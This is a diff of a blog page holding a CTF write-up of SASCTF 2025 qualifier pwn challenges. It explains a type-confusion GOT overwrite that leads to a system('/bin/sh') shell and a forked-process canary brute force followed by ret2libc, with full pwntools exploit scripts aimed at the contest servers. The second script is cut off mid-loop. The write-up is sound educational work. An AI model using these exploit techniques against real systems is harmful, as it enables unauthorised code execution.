@@ -5,8 +5,8 @@
   <meta name="Volantis" content="5.8.0">
   <meta charset="utf-8">
   <!-- SEO相关 -->
-  <meta name="robots" content="noindex,follow">
-  <link rel="canonical" href="https://stackc00ki3.github.io/tags/integer-overflow/"/>
+  
+  <link rel="canonical" href="https://stackc00ki3.github.io/2025/05/27/sasctf2025quals/"/>
   <!-- 渲染优化 -->
     <meta http-equiv='x-dns-prefetch-control' content='on' />
       <link rel='dns-prefetch' href='https://unpkg.com'>
@@ -33,16 +33,22 @@
 
   <!-- feed -->
   <!-- 页面元数据 -->
-  <title>Tag: integer overflow - blog</title>
-  <meta name="keywords" content="null">
-  <meta desc name="description" content="blog - St4ckC00ki3 - blog">
-  <meta property="og:type" content="website">
-<meta property="og:title" content="blog">
-<meta property="og:url" content="https://stackc00ki3.github.io/tags/integer-overflow/index.html">
+  <title>SASCTF 2025 Quals Pwn - blog</title>
+  <meta name="keywords" content="bruteforce canary,type confusion,null">
+  <meta desc name="description" content="forking... - St4ckC00ki3 - blog">
+  
+<meta property="og:type" content="article">
+<meta property="og:title" content="SASCTF 2025 Quals Pwn">
+<meta property="og:url" content="https://stackc00ki3.github.io/2025/05/27/SASCTF2025Quals/index.html">
 <meta property="og:site_name" content="blog">
+<meta property="og:description" content="forking...">
 <meta property="og:locale" content="en_US">
 <meta property="og:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
+<meta property="article:published_time" content="2025-05-27T03:44:58.000Z">
+<meta property="article:modified_time" content="2025-05-27T04:00:01.798Z">
 <meta property="article:author" content="St4ckC00ki3">
+<meta property="article:tag" content="bruteforce canary">
+<meta property="article:tag" content="type confusion">
 <meta name="twitter:card" content="summary">
 <meta name="twitter:image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
   <style>
@@ -2639,7 +2645,7 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
   
     
       <!-- see: /layout/_partial/scripts/_ctrl/coverCtrl.ejs -->
-      <div id="none" class='cover-wrapper  dock' style="display: none;">
+      <div id="none" class='cover-wrapper post dock' style="display: none;">
         
   <div id="parallax-window"></div>
 
@@ -2726,25 +2732,9 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
       <div id="safearea">
         <div class="body-wrapper">
           
-
 <div id="l_main" class=''>
-  
-    
-      
-  <section class="post-list">
-    
-      
-        
-          
-        
-      
-    
-    
-      
-        
-          <div class='post-wrapper'>
-            <div class="post post-v3 white-box reveal shadow floatable blur"  itemscope itemtype="http://schema.org/Article" >
-  <link itemprop="mainEntityOfPage" href="https://stackc00ki3.github.io/2025/04/07/NCTF2025/">
+  <article itemscope itemtype="http://schema.org/Article" class="article post white-box reveal md shadow floatable blur article-type-post" id="post" itemscope itemprop="blogPost">
+  <link itemprop="mainEntityOfPage" href="https://stackc00ki3.github.io/2025/05/27/SASCTF2025Quals/">
   <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
     <meta itemprop="name" content="blog">
   </span>
@@ -2753,64 +2743,223 @@ if (/*@cc_on!@*/false || (!!window.MSInputMethodContext && !!document.documentMo
     <meta itemprop="description" content="">
   </span>
   
-  
+
+
   
     <span hidden>
       <meta itemprop="image" content="https://unpkg.com/volantis-static@0.0.1654736714924/media/org.volantis/blog/favicon/android-chrome-192x192.png">
     </span>
   
-  
+  <div class="article-meta" id="top">
     
-    <h2 class="article-title"  itemprop="name headline">
-      <a href="/2025/04/07/NCTF2025/"  itemprop="url">
-        NCTF2025 Pwn
-      </a>
-    </h2>
-  
-  <div class='md article-desc' itemprop="articleBody">
     
-      what's SGX
     
-  </div>
-  
-    <div class='meta-v3' line_style='solid'>
-      <div>
+      <h1 class="title" itemprop="name headline">
+        SASCTF 2025 Quals Pwn
+      </h1>
+      <div class='new-meta-box'>
         
           
-          <a class='avatar' target="_blank" rel="noopener" href='https://github.com/StackC00ki3/'><img src='/images/author.png'></a>
-          <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-            <meta itemprop="image" content="/images/author.png">
-            <meta itemprop="name" content="StackC00ki3">
-            <meta itemprop="url" content="https://github.com/StackC00ki3/">
-          </span>
+            
+<div class='new-meta-item author' itemprop="author" itemscope itemtype="http://schema.org/Person">
+  <a itemprop="url" class='author' target="_blank" href="https://github.com/StackC00ki3/" rel="nofollow noopener">
+    <img itemprop="image" src="/images/author.png" class="lazyload" data-srcset="/images/author.png" srcset="data:image/gif;base64,R0lGODlhAQABAIAAAP///////yH5BAEKAAEALAAAAAABAAEAAAICTAEAOw==">
+    <p itemprop="name">StackC00ki3</p>
+  </a>
+</div>
+
+          
         
-        <time itemprop="dateCreated datePublished" datetime="2025-04-07T15:19:59+08:00">2025-04-07</time>
+          
+            
+
+          
         
+          
+            <div class="new-meta-item date" itemprop="dateCreated datePublished" datetime="2025-05-27T11:44:58+08:00">
+  <a class='notlink'>
+    <i class="fa-solid fa-calendar-alt fa-fw" aria-hidden="true"></i>
+    <p>发布于：May 27, 2025</p>
+  </a>
+</div>
+
+          
+        
+        <!-- Custom Files topMeta begin-->
+        
+        <!-- Custom Files topMeta end-->
       </div>
+    
+  </div>
+
+
+  <div id="layoutHelper-page-plugins"></div>
+  <div id="post-body" itemprop="articleBody">
+    <div class="story post-story"><h2 id="My-Type"><a href="#My-Type" class="headerlink" title="My Type"></a>My Type</h2><h3 id="题目描述"><a href="#题目描述" class="headerlink" title="题目描述"></a>题目描述</h3><p>A girl just joined our public channel. She’s quite into the crypto as I can see, very nice. Wonder if we are compatible with each other or not…</p>
+<h3 id="题目功能"><a href="#题目功能" class="headerlink" title="题目功能"></a>题目功能</h3><p>允许多次创建 <code>struct sign</code> 并修改第二个 <code>union&#123;&#125;</code> ，然后会对 sign 结构体按类型检查，检查过以后更新 score 。</p>
+<figure class="highlight c"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">sign</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> type;</span><br><span class="line">  <span class="class"><span class="keyword">union</span></span></span><br><span class="line"><span class="class">  &#123;</span></span><br><span class="line">    __int64 nft;</span><br><span class="line">    <span class="type">char</span> *compliment;</span><br><span class="line">  &#125;;</span><br><span class="line">&#125;;</span><br><span class="line"></span><br><span class="line"><span class="class"><span class="keyword">struct</span> <span class="title">partner</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line">  <span class="type">int</span> score;</span><br><span class="line">  __int64 mood;</span><br><span class="line">&#125;;</span><br></pre></td></tr></table></figure>
+
+<h3 id="漏洞点"><a href="#漏洞点" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>存在类型混淆漏洞，</p>
+<p><code>edit_nft</code> 设置32位的指针</p>
+<p><code>edit_compliment</code> 修改指针处256字节的内存</p>
+<p>原语：任意32位地址写256字节</p>
+<h3 id="利用思路"><a href="#利用思路" class="headerlink" title="利用思路"></a>利用思路</h3><p>先改got strlen为printf泄露libc</p>
+<p>然后改got strlen为system</p>
+<p>最后system(”&#x2F;bin&#x2F;sh”)</p>
+<p>flag: <code>SAS&#123;y0u_GOT_y0ur_typ3_f0r_r341&#125;</code></p>
+<h3 id="EXP"><a href="#EXP" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;chall.elf_patched&quot;</span></span><br><span class="line">libcname = <span class="string">&quot;/home/botdebug/.config/cpwn/pkgs/2.40-1ubuntu3/amd64/libc6_2.40-1ubuntu3_amd64/usr/lib/x86_64-linux-gnu/libc.so.6&quot;</span></span><br><span class="line">host = <span class="string">&quot;tcp.sasc.tf&quot;</span></span><br><span class="line">port = <span class="number">13953</span></span><br><span class="line">elf = context.binary = ELF(filename)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;neww&quot;</span>]</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">if</span> libcname:</span><br><span class="line">    libc = ELF(libcname)</span><br><span class="line">gs = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">b *0x0004014FE</span></span><br><span class="line"><span class="string">set debug-file-directory /home/botdebug/.config/cpwn/pkgs/2.40-1ubuntu3/amd64/libc6-dbg_2.40-1ubuntu3_amd64/usr/lib/debug</span></span><br><span class="line"><span class="string">set directories /home/botdebug/.config/cpwn/pkgs/2.40-1ubuntu3/amd64/glibc-source_2.40-1ubuntu3_all/usr/src/glibc/glibc-2.40</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript=gs)</span><br><span class="line">    <span class="keyword">elif</span> args.REMOTE:</span><br><span class="line">        <span class="keyword">return</span> remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_address</span>():</span><br><span class="line">    <span class="keyword">if</span> context.arch == <span class="string">&quot;i386&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_address2</span>(<span class="params">timeout=<span class="number">0.1</span></span>):</span><br><span class="line">    contains = <span class="string">b&quot;\x7f&quot;</span> <span class="keyword">if</span> context.bits == <span class="number">64</span> <span class="keyword">else</span> <span class="string">b&quot;\xf7&quot;</span></span><br><span class="line">    m = p.recvuntil(contains, timeout=timeout)</span><br><span class="line">    <span class="keyword">if</span> contains <span class="keyword">not</span> <span class="keyword">in</span> m:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;Cannot get libc addr&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> context.bits == <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> u32(m[-<span class="number">4</span>:])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> u64(m[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    <span class="keyword">if</span> args.AT:</span><br><span class="line">        gdb.attach(p, gs)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> x: p.recvline(x)</span><br><span class="line">ia = <span class="keyword">lambda</span>: p.interactive()</span><br><span class="line">op32 = make_packer(<span class="number">32</span>, endian=<span class="string">&quot;big&quot;</span>, sign=<span class="string">&quot;unsigned&quot;</span>)  <span class="comment"># opposite p32</span></span><br><span class="line">op64 = make_packer(<span class="number">64</span>, endian=<span class="string">&quot;big&quot;</span>, sign=<span class="string">&quot;unsigned&quot;</span>)  <span class="comment"># opposite p64</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Your exploit here</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_nft</span>(<span class="params">val</span>):</span><br><span class="line">    ru(<span class="string">b&quot;Enter your choice (n/c): &quot;</span>)</span><br><span class="line">    sl(<span class="string">b&quot;n&quot;</span>)</span><br><span class="line">    ru(<span class="string">&quot;the NFT: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(val))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">create_comp</span>(<span class="params">val</span>):</span><br><span class="line">    ru(<span class="string">b&quot;Enter your choice (n/c): &quot;</span>)</span><br><span class="line">    sl(<span class="string">b&quot;c&quot;</span>)</span><br><span class="line">    ru(<span class="string">&quot;(max 256 chars): &quot;</span>)</span><br><span class="line">    sl(val)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_nft</span>(<span class="params">val</span>):</span><br><span class="line">    ru(<span class="string">&quot;Enter your choice (n/c/p): &quot;</span>)</span><br><span class="line">    sl(<span class="string">b&quot;n&quot;</span>)</span><br><span class="line">    ru(<span class="string">&quot;the NFT: &quot;</span>)</span><br><span class="line">    sl(<span class="built_in">str</span>(val))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">edit_comp</span>(<span class="params">val</span>):</span><br><span class="line">    ru(<span class="string">&quot;Enter your choice (n/c/p): &quot;</span>)</span><br><span class="line">    sl(<span class="string">b&quot;c&quot;</span>)</span><br><span class="line">    ru(<span class="string">&quot;(max 256 chars): &quot;</span>)</span><br><span class="line">    sl(val)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">play_sign</span>():</span><br><span class="line">    ru(<span class="string">&quot;Enter your choice (n/c/p): &quot;</span>)</span><br><span class="line">    sl(<span class="string">b&quot;p&quot;</span>)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line">    create_comp(<span class="string">b&quot;BBB&quot;</span>)</span><br><span class="line">    edit_nft(elf.got[<span class="string">&quot;strlen&quot;</span>])</span><br><span class="line">    edit_comp(p64(elf.plt[<span class="string">&quot;printf&quot;</span>]))</span><br><span class="line">    play_sign()</span><br><span class="line"></span><br><span class="line">    create_comp(<span class="string">b&quot;%27$p&quot;</span>)</span><br><span class="line">    play_sign()</span><br><span class="line">    ru(<span class="string">b&quot;\n&quot;</span>)</span><br><span class="line">    libc_base = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&quot;\n&quot;</span>, <span class="literal">True</span>), <span class="number">16</span>) - <span class="number">0x2A3B8</span></span><br><span class="line">    leak_ex2(libc_base)</span><br><span class="line">    libc.address = libc_base</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">    create_comp(<span class="string">b&quot;BBB&quot;</span>)</span><br><span class="line">    edit_nft(elf.got[<span class="string">&quot;strlen&quot;</span>])</span><br><span class="line">    edit_comp(p64(libc.sym[<span class="string">&#x27;system&#x27;</span>]))</span><br><span class="line">    play_sign()</span><br><span class="line"></span><br><span class="line">    create_comp(<span class="string">b&quot;/bin/sh\x00&quot;</span>)</span><br><span class="line">    play_sign()</span><br><span class="line">    ia()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">exp()</span><br></pre></td></tr></table></figure>
+
+
+</div><div class="story post-story"><h2 id="Mickey-1337"><a href="#Mickey-1337" class="headerlink" title="Mickey 1337"></a>Mickey 1337</h2><h3 id="题目描述-1"><a href="#题目描述-1" class="headerlink" title="题目描述"></a>题目描述</h3><p>You are a space worker from a human colony on a harsh planet. In order to survive, you can create copies of yourself to perform dangerous work, but the fate of the copies is usually sad. Try to make the most of it.</p>
+<h3 id="题目功能-1"><a href="#题目功能-1" class="headerlink" title="题目功能"></a>题目功能</h3><p>主线程无限fork子进程，子进程中输入信息后结束子进程。无泄露地址功能。</p>
+<h3 id="漏洞点-1"><a href="#漏洞点-1" class="headerlink" title="漏洞点"></a>漏洞点</h3><p>无pie，栈溢出但有canary，允许无限fork。</p>
+<h3 id="利用思路-1"><a href="#利用思路-1" class="headerlink" title="利用思路"></a>利用思路</h3><p>由于fork的子进程canary相同，one-by-one 爆破 Canary</p>
+<p>然后通过leave控制rbp，利用以下gadget实现泄露任意地址原语，泄露libc地址</p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><span class="line">.text:00000000004012D4                 mov     rax, [rbp-8]</span><br><span class="line">.text:00000000004012D8                 mov     rdi, rax        ; s</span><br><span class="line">.text:00000000004012DB                 call    _puts</span><br></pre></td></tr></table></figure>
+
+<p>最后ret2libc</p>
+<h3 id="EXP-1"><a href="#EXP-1" class="headerlink" title="EXP"></a>EXP</h3><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br><span class="line">94</span><br><span class="line">95</span><br><span class="line">96</span><br><span class="line">97</span><br><span class="line">98</span><br><span class="line">99</span><br><span class="line">100</span><br><span class="line">101</span><br><span class="line">102</span><br><span class="line">103</span><br><span class="line">104</span><br><span class="line">105</span><br><span class="line">106</span><br><span class="line">107</span><br><span class="line">108</span><br><span class="line">109</span><br><span class="line">110</span><br><span class="line">111</span><br><span class="line">112</span><br><span class="line">113</span><br><span class="line">114</span><br><span class="line">115</span><br><span class="line">116</span><br><span class="line">117</span><br><span class="line">118</span><br><span class="line">119</span><br><span class="line">120</span><br><span class="line">121</span><br><span class="line">122</span><br><span class="line">123</span><br><span class="line">124</span><br><span class="line">125</span><br><span class="line">126</span><br><span class="line">127</span><br><span class="line">128</span><br><span class="line">129</span><br><span class="line">130</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">#!/usr/bin/env python</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">from</span> pwncli <span class="keyword">import</span> *</span><br><span class="line"></span><br><span class="line">filename = <span class="string">&quot;chall.elf_patched&quot;</span></span><br><span class="line">libcname = <span class="string">&quot;./libc.so.6&quot;</span></span><br><span class="line">host = <span class="string">&quot;tcp.sasc.tf&quot;</span></span><br><span class="line">port = <span class="number">10080</span></span><br><span class="line">elf = context.binary = ELF(filename)</span><br><span class="line">context.terminal = [<span class="string">&quot;tmux&quot;</span>, <span class="string">&quot;neww&quot;</span>]</span><br><span class="line">context.log_level = <span class="string">&quot;debug&quot;</span></span><br><span class="line"><span class="keyword">if</span> libcname:</span><br><span class="line">    libc = ELF(libcname)</span><br><span class="line">gs = <span class="string">&quot;&quot;&quot;</span></span><br><span class="line"><span class="string">b main</span></span><br><span class="line"><span class="string">b *0x0004012DB</span></span><br><span class="line"><span class="string">set debug-file-directory /home/botdebug/.config/cpwn/pkgs/2.40-1ubuntu3/amd64/libc6-dbg_2.40-1ubuntu3_amd64/usr/lib/debug</span></span><br><span class="line"><span class="string">set directories /home/botdebug/.config/cpwn/pkgs/2.40-1ubuntu3/amd64/glibc-source_2.40-1ubuntu3_all/usr/src/glibc/glibc-2.40</span></span><br><span class="line"><span class="string">&quot;&quot;&quot;</span></span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">start</span>():</span><br><span class="line">    <span class="keyword">if</span> args.GDB:</span><br><span class="line">        <span class="keyword">return</span> gdb.debug(elf.path, gdbscript=gs)</span><br><span class="line">    <span class="keyword">elif</span> args.REMOTE:</span><br><span class="line">        <span class="keyword">return</span> remote(host, port)</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> process(elf.path)</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">p = start()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_address</span>():</span><br><span class="line">    <span class="keyword">if</span> context.arch == <span class="string">&quot;i386&quot;</span>:</span><br><span class="line">        <span class="keyword">return</span> u32(p.recv(<span class="number">4</span>))</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> u64(p.recv(<span class="number">6</span>).ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">leak_address2</span>(<span class="params">timeout=<span class="number">0.1</span></span>):</span><br><span class="line">    contains = <span class="string">b&quot;\x7f&quot;</span> <span class="keyword">if</span> context.bits == <span class="number">64</span> <span class="keyword">else</span> <span class="string">b&quot;\xf7&quot;</span></span><br><span class="line">    m = p.recvuntil(contains, timeout=timeout)</span><br><span class="line">    <span class="keyword">if</span> contains <span class="keyword">not</span> <span class="keyword">in</span> m:</span><br><span class="line">        <span class="keyword">raise</span> RuntimeError(<span class="string">&quot;Cannot get libc addr&quot;</span>)</span><br><span class="line">    <span class="keyword">if</span> context.bits == <span class="number">32</span>:</span><br><span class="line">        <span class="keyword">return</span> u32(m[-<span class="number">4</span>:])</span><br><span class="line">    <span class="keyword">else</span>:</span><br><span class="line">        <span class="keyword">return</span> u64(m[-<span class="number">6</span>:].ljust(<span class="number">8</span>, <span class="string">b&quot;\x00&quot;</span>))</span><br><span class="line"></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">dbg</span>():</span><br><span class="line">    <span class="keyword">if</span> args.AT:</span><br><span class="line">        gdb.attach(p, gs)</span><br><span class="line">    pause()</span><br><span class="line"></span><br><span class="line"></span><br><span class="line">s = <span class="keyword">lambda</span> x: p.send(x)</span><br><span class="line">sl = <span class="keyword">lambda</span> x: p.sendline(x)</span><br><span class="line">sa = <span class="keyword">lambda</span> x, y: p.sendafter(x, y)</span><br><span class="line">sla = <span class="keyword">lambda</span> x, y: p.sendlineafter(x, y)</span><br><span class="line">r = <span class="keyword">lambda</span> x: p.recv(x)</span><br><span class="line">ru = <span class="keyword">lambda</span> x: p.recvuntil(x)</span><br><span class="line">rl = <span class="keyword">lambda</span> x: p.recvline(x)</span><br><span class="line">ia = <span class="keyword">lambda</span>: p.interactive()</span><br><span class="line">op32 = make_packer(<span class="number">32</span>, endian=<span class="string">&quot;big&quot;</span>, sign=<span class="string">&quot;unsigned&quot;</span>)  <span class="comment"># opposite p32</span></span><br><span class="line">op64 = make_packer(<span class="number">64</span>, endian=<span class="string">&quot;big&quot;</span>, sign=<span class="string">&quot;unsigned&quot;</span>)  <span class="comment"># opposite p64</span></span><br><span class="line"></span><br><span class="line"><span class="comment"># Your exploit here</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_child</span>(<span class="params">msg</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;[Mickey-&#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    ru(<span class="string">b&#x27;[Mickey-&#x27;</span>)</span><br><span class="line">    child = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;]: &#x27;</span>, <span class="literal">True</span>))</span><br><span class="line">    <span class="comment"># leak_ex2(child)</span></span><br><span class="line">    s(msg)</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">send_child2</span>(<span class="params">msg</span>):</span><br><span class="line">    ru(<span class="string">b&#x27;[Mickey-&#x27;</span>)</span><br><span class="line">    sl(<span class="string">b&#x27;1&#x27;</span>)</span><br><span class="line">    pause()</span><br><span class="line">    ru(<span class="string">b&#x27;[Mickey-&#x27;</span>)</span><br><span class="line">    child = <span class="built_in">int</span>(p.recvuntil(<span class="string">b&#x27;]: &#x27;</span>, <span class="literal">True</span>))</span><br><span class="line">    <span class="comment"># leak_ex2(child)</span></span><br><span class="line">    s(msg)</span><br><span class="line"></span><br><span class="line"><span class="comment"># gift[&#x27;elf&#x27;] = elf</span></span><br><span class="line"><span class="comment"># CG.set_find_area(True,True,False)</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">exp</span>():</span><br><span class="line"></span><br><span class="line">    canary = <span class="string">&#x27;\x00&#x27;</span></span><br><span class="line">    <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">7</span>):</span><br><span class="line">        <span class="keyword">for</span> i <span class="keyword">in</span> <span class="built_in">range</span>(<span class="number">256</span>):</span><br><span class="line">            